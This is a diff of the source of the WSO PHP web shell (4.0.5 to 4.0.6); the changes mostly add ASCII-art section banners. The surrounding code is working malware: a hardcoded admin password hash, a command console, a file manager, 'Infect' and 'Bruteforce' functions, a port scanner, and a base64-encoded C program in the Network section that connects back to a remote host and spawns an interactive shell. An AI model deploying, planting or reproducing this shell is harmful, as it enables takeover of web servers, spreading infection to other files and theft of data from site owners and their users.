@@ -1,5 +1,12 @@
 <?php
-/* WSO 4.0.5 (Web Shell by HARD _LINUX) */
+	/* WSO 4.0.6 (Web Shell by HARD _LINUX)
+	█──█──████──████──████─────────█────███──█──█──█─█──██─██
+	█──█──█──█──█──█──█──██────────█─────█───██─█──█─█───███
+	████──████──████──█──██────────█─────█───█─██──█─█────█
+	█──█──█──█──█─█───█──██────────█─────█───█──█──█─█───███
+	█──█──█──█──█─█───████─────────███──███──█──█──███──██─██
+	─────────────────────────██████
+	*/
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +22,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.0.5');
+@define('VERSION', '4.0.6');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -126,7 +133,6 @@ function printHeader() {
 	function processReqChange() {
 		if( (req.readyState == 4) )
 			if(req.status == 200) {
-				//alert(req.responseText);
 				var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
 				var arr=reg.exec(req.responseText);
 				eval(arr[2].substr(0, arr[1]));
@@ -306,7 +312,13 @@ function which($p) {
 	return false;
 }
 
-// Sec. Info go --------------------
+	/* Sec. Info go -------------------------
+	███──███──████───────███──█──█──███──████
+	█────█────█──█────────█───██─█──█────█──█
+	███──███──█───────────█───█─██──███──█──█
+	──█──█────█──█────────█───█──█──█────█──█
+	███──███──████──█────███──█──█──█────████
+	*/
 function actionSecInfo() {
 	printHeader();
 	echo '<h1>Server security information</h1><div class=content>';
@@ -385,9 +397,15 @@ function actionSecInfo() {
 	echo '</div>';
 	printFooter();
 }
-// Sec. Info end --------------------
+	// Sec. Info end ------------------------------
 
-// File tools go -----------------------
+	/* File tools go ------------------------------
+	███──███──█────███────███──████──████──█────███
+	█─────█───█────█───────█───█──█──█──█──█────█
+	███───█───█────███─────█───█──█──█──█──█────███
+	█─────█───█────█───────█───█──█──█──█──█──────█
+	█────███──███──███─────█───████──████──███──███
+	*/
 function actionFilesTools() {
 	if( isset($_POST['p1']) )
 		$_POST['p1'] = urldecode($_POST['p1']);
@@ -539,9 +557,15 @@ function actionFilesTools() {
 	echo '</div>';
 	printFooter();
 }
-// File tools end ----------------------
+	// File tools end -------------------
 
-// Console go --------------------
+	/* Console go -----------------------
+	████──████──█──█──███──████──█────███
+	█──█──█──█──██─█──█────█──█──█────█
+	█─────█──█──█─██──███──█──█──█────███
+	█──█──█──█──█──█────█──█──█──█────█
+	████──████──█──█──███──████──███──███
+	*/
 if($os == 'win')
 	$aliases = array(
 		"List Directory" => "dir",
@@ -676,9 +700,15 @@ function add(cmd) {
 	echo '</form></div><script>document.cf.cmd.focus();</script>';
 	printFooter();
 }
-// Console end --------------------
+	// Console end -
 
-// PHP -----------------------
+	/* PHP ---------
+	████──█──█──████
+	█──█──█──█──█──█
+	████──████──████
+	█─────█──█──█
+	█─────█──█──█
+	*/
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
 		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
@@ -714,9 +744,15 @@ function actionPhp() {
 	echo '</pre></div>';
 	printFooter();
 }
-// PHP end --------------------
+	// PHP end ---------------------------------------------------
 
-// File manager go --------------------
+	/* File manager go -------------------------------------------
+	███──███──█────███────█───██─████──█──█──████──████──███──████
+	█─────█───█────█──────██─███─█──█──██─█──█──█──█─────█────█──█
+	███───█───█────███────█─█─██─████──█─██──████──█─██──███──████
+	█─────█───█────█──────█───██─█──█──█──█──█──█──█──█──█────█─█
+	█────███──███──███────█───██─█──█──█──█──█──█──████──███──█─█
+	*/
 function actionFilesMan() {
 	printHeader();
 	echo '<h1>File manager</h1><div class=content>';
@@ -870,9 +906,15 @@ function actionFilesMan() {
 	<?php
 	printFooter();
 }
-// File manager end --------------------
+	// File manager end ----------------------------------------
 
-// String tools go --------------------
+	/* String tools go -----------------------------------------
+	███──███──████──███──█──█──████────███──████──████──█────███
+	█─────█───█──█───█───██─█──█────────█───█──█──█──█──█────█
+	███───█───████───█───█─██──█─██─────█───█──█──█──█──█────███
+	──█───█───█─█────█───█──█──█──█─────█───█──█──█──█──█──────█
+	███───█───█─█───███──█──█──████─────█───████──████──███──███
+	*/
 function actionStringTools() {
 	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
     if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
@@ -961,9 +1003,15 @@ function actionStringTools() {
 		</form></div>";
 	printFooter();
 }
-// String tools end --------------------
+	// String tools end --------------------------
 
-// Safe mode go ------------------------
+	/* Safe mode go ------------------------------
+	███──████──███──███────█───██─████──████───███
+	█────█──█──█────█──────██─███─█──█──█──██──█
+	███──████──███──███────█─█─██─█──█──█──██──███
+	──█──█──█──█────█──────█───██─█──█──█──██──█
+	███──█──█──█────███────█───██─████──████───███
+	*/
 function actionSafeMode() {
 	$temp='';
 	ob_start();
@@ -1016,16 +1064,28 @@ function actionSafeMode() {
 	echo '</div>';
 	printFooter();
 }
-// Safe mode end ---------------------
+	// Safe mode end --------------
 
-// Logout go -------------------------
+	/* Logout go ------------------
+	█────████──████──████──█─█──███
+	█────█──█──█─────█──█──█─█───█
+	█────█──█──█─██──█──█──█─█───█
+	█────█──█──█──█──█──█──█─█───█
+	███──████──████──████──███───█
+	*/
 function actionLogout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
 }
-// Logout end -------------------------
+	// Logout end ----------------------
 
-// Suicide go -------------------------
+	/* Suicide go ----------------------
+	███──█─█──███──████──███──████───███
+	█────█─█───█───█──█───█───█──██──█
+	███──█─█───█───█──────█───█──██──███
+	──█──█─█───█───█──█───█───█──██──█
+	███──███──███──████──███──████───███
+	*/
 function actionSelfRemove() {
 	printHeader();
 	if($_POST['p1'] == 'yes') {
@@ -1037,7 +1097,7 @@ function actionSelfRemove() {
 	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
 	printFooter();
 }
-// Suicide end -------------------------
+	// Suicide end -------------------------
 
 function actionTools() {
 	printHeader();
@@ -1045,7 +1105,13 @@ function actionTools() {
 		printFooter();
 }
 
-// Domains go -------------------------
+	/* Domains go --------------------------
+	████───████──█───██─████──███──█──█──███
+	█──██──█──█──██─███─█──█───█───██─█──█
+	█──██──█──█──█─█─██─████───█───█─██──███
+	█──██──█──█──█───██─█──█───█───█──█────█
+	████───████──█───██─█──█──███──█──█──███
+	*/
 function actionDomains() {
 	printHeader();
 	error_reporting(0);
@@ -1076,9 +1142,15 @@ href='http://wWw.sEc4EvEr.CoM/'>wWw.sEc4EvEr.CoM</a><br>
 "; 
 	printFooter();
 }
-// Domains end -----------------------
+	// Domains end ---------------
 
-// Infect go -------------------------
+	/* Infect go -----------------
+	███──█──█──███──███──████──███
+	─█───██─█──█────█────█──█───█
+	─█───█─██──███──███──█──────█
+	─█───█──█──█────█────█──█───█
+	███──█──█──█────███──████───█
+	*/
 function actionInfect() {
 	printHeader();
 	echo '<h1>Infect</h1><div class=content>';
@@ -1118,9 +1190,15 @@ function actionInfect() {
 		}
 	printFooter();
 }
-// Infect end -----------------------
+	// Infect end ----------------------------------------
 
-// Bruteforce go --------------------
+	/* Bruteforce go -------------------------------------
+	████───████──█─█──███──███──███──████──████──████──███
+	█──██──█──█──█─█───█───█────█────█──█──█──█──█──█──█
+	████───████──█─█───█───███──███──█──█──████──█─────███
+	█──██──█─█───█─█───█───█────█────█──█──█─█───█──█──█
+	████───█─█───███───█───███──█────████──█─█───████──███
+	*/
 function actionBruteforce() {
 	printHeader();
 	if( isset($_POST['proto']) ) {
@@ -1204,9 +1282,16 @@ function actionBruteforce() {
 	echo '</div><br>';
 	printFooter();
 }
-// Bruteforce end --------------------
+	// Bruteforce end -----------------------------------------
 
-// Sql go ----------------------------
+	/* Sql browser go -----------------------------------------
+	███──████───█──────████───████──████──█───█──███──███──████
+	█────█──█───█──────█──██──█──█──█──█──█───█──█────█────█──█
+	███──█─██───█──────████───████──█──█──█─█─█──███──███──████
+	──█──█──█───█──────█──██──█─█───█──█──█████────█──█────█─█
+	███──█████──███────████───█─█───████───█─█───███──███──█─█
+	─────────██
+	*/
 function actionSql() {
 	class DbClass {
 		var $type;
@@ -1489,9 +1574,15 @@ function actionSql() {
 	echo '</div>';
 	printFooter();
 }
-// Sql end -------------------------
+	// Sql browser end --------------------
 
-// Network go --------------------
+	/* Network go -------------------------
+	█──█──███──███──█───█──████──████──█──█
+	██─█──█─────█───█───█──█──█──█──█──█─█
+	█─██──███───█───█─█─█──█──█──████──██
+	█──█──█─────█───█████──█──█──█─█───█─█
+	█──█──███───█────█─█───████──█─█───█──█
+	*/
 function actionNetwork() {
 	printHeader();
 	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
@@ -1543,9 +1634,15 @@ function actionNetwork() {
 	echo '</div>';
 	printFooter();
 }
-// Network end --------------------
+	// Network end ------------------------------------------------
 
-// Port Scanner go --------------------
+	/* Port Scanner go --------------------------------------------
+	████──████──████──███────███──████──████──█──█──█──█──███──████
+	█──█──█──█──█──█───█─────█────█──█──█──█──██─█──██─█──█────█──█
+	████──█──█──████───█─────███──█─────████──█─██──█─██──███──████
+	█─────█──█──█─█────█───────█──█──█──█──█──█──█──█──█──█────█─█
+	█─────████──█─█────█─────███──████──█──█──█──█──█──█──███──█─█
+	*/
 function actionPortScanner() {
     printHeader();
     echo '<h1>Port Scanner</h1>';
@@ -1576,7 +1673,7 @@ function actionPortScanner() {
     echo '</div>';
     printFooter();    
 }
-// Port Scanner end --------------------
+	// Port Scanner end --------------------
 
 if( empty($_POST['a']) )
 	if(isset($default_action) && function_exists('action' . $default_action))
